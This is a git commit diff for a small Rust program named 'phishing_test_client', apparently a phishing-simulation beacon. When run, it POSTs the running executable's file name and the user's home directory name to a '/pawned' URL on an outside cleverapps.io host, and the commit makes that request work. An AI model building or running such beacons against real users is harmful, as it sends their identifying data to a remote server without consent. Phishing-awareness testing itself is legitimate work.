f4e0b22372f9242ef142229bc609b88b4336e21d
dlescos <66389253+dlescos@users.noreply.github.com>
2023-02-13 12:46:27 +0100

    fix: bad argument sent to server.

--- phishing_test_client/src/main.rs
+++ phishing_test_client/src/main.rs
@@ -1,13 +1,15 @@
 use std::{env};
 use dirs;
 
-const SERVER_URL: &str = "http://app-b4391c87-fd8e-4408-806f-5810e7778883.cleverapps.io/pawned";
+const SERVER_URL: &str = "http://app-262498ad-d64a-476c-b647-8c11740d78fc.cleverapps.io/pawned";
 
 fn main() {
     let current_exe = env::current_exe().unwrap();
     let current_exe_fname = current_exe.file_name().unwrap().to_str().unwrap();
     let pb_homedir = dirs::home_dir().unwrap();
-    let homedir = pb_homedir.to_str().unwrap();
-    let client = reqwest::Client::new();
-    let _ = client.post(format!("{SERVER_URL}/{current_exe_fname}/{homedir}")).send();
+    let homedir = pb_homedir.file_name().unwrap().to_str().unwrap();
+    let client = reqwest::blocking::Client::new();
+    dbg!(current_exe_fname);
+    dbg!(homedir);
+    client.post(format!("{SERVER_URL}/{current_exe_fname}/{homedir}")).send().unwrap();
 }
